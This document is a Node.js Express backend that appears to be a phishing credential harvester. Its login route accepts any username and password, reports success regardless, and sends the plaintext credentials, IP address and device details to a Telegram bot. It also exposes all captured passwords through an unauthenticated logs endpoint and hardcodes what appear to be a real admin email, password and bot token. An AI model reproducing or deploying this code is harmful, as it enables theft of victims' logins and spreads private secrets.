const express = require("express");
const bodyParser = require("body-parser");
const https = require("https");
const cors = require("cors");

const app = express();

// Environment variables
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "rahulkushwaha1842003@gmail.com";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Rewa@1234";
const BOT_TOKEN = process.env.BOT_TOKEN || "8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM".replace(/\s/g, "");
let CHAT_ID = process.env.CHAT_ID || "YOUR_CHAT_ID_HERE";

// Store login logs in memory
const loginLogs = [];

// Get chat ID helper function
async function getChatId() {
  if (CHAT_ID !== "YOUR_CHAT_ID_HERE") {
    return CHAT_ID;
  }

  return new Promise((resolve, reject) => {
    const options = {
      hostname: "api.telegram.org",
      path: `/bot${BOT_TOKEN}/getUpdates`,
      method: "GET",
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (d) => {
        data += d;
      });
      res.on("end", () => {
        try {
          const response = JSON.parse(data);
          if (response.result && response.result.length > 0) {
            const latestMessage = response.result[response.result.length - 1];
            const chatId = latestMessage.message.chat.id;
            CHAT_ID = chatId;
            console.log(`🔍 Found Chat ID: ${chatId}`);
            resolve(chatId);
          } else {
            reject(new Error("No chat ID found"));
          }
        } catch (error) {
          reject(error);
        }
      });
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.end();
  });
}

// Send message to Telegram
async function sendTelegramMessage(message) {
  try {
    const chatId = await getChatId();
    
    return new Promise((resolve, reject) => {
      const data = JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      });

      const options = {
        hostname: "api.telegram.org",
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": data.length,
        },
      };

      const req = https.request(options, (res) => {
        let responseData = "";
        res.on("data", (chunk) => {
          responseData += chunk;
        });
        res.on("end", () => {
          try {
            const response = JSON.parse(responseData);
            if (response.ok) {
              console.log("✅ Telegram message sent successfully");
              resolve(response);
            } else {
              console.error("❌ Telegram API error:", response.description);
              reject(new Error(response.description));
            }
          } catch (error) {
            reject(error);
          }
        });
      });

      req.on("error", (error) => {
        console.error("❌ Telegram request error:", error);
        reject(error);
      });

      req.write(data);
      req.end();
    });
  } catch (error) {
    console.error("❌ Error getting chat ID:", error);
    throw error;
  }
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// API Routes
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  
  const logEntry = {
    timestamp: new Date().toISOString(),
    username,
    password,
    ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    userAgent: req.headers['user-agent']
  };
  
  loginLogs.push(logEntry);
  
  const telegramMessage = `
🚨 <b>New Login Attempt</b> 🚨

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
🕐 <b>Time:</b> ${logEntry.timestamp}
🌐 <b>IP:</b> ${logEntry.ip}
💻 <b>Device:</b> ${logEntry.userAgent}
  `;
  
  try {
    await sendTelegramMessage(telegramMessage);
    res.json({ success: true, message: "Login successful" });
  } catch (error) {
    console.error("Failed to send Telegram notification:", error);
    res.status(500).json({ success: false, message: "Login failed" });
  }
});

app.get("/api/logs", (req, res) => {
  res.json({ logs: loginLogs });
});

app.post("/api/admin", (req, res) => {
  const { username, password } = req.body;
  
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    res.json({ success: true, logs: loginLogs });
  } else {
    res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// Health check
app.get("/api/health", (req, res) => {
  res.json({ status: "Server running", timestamp: new Date().toISOString() });
});

// Export for Vercel serverless
module.exports = (req, res) => {
  app(req, res);
};
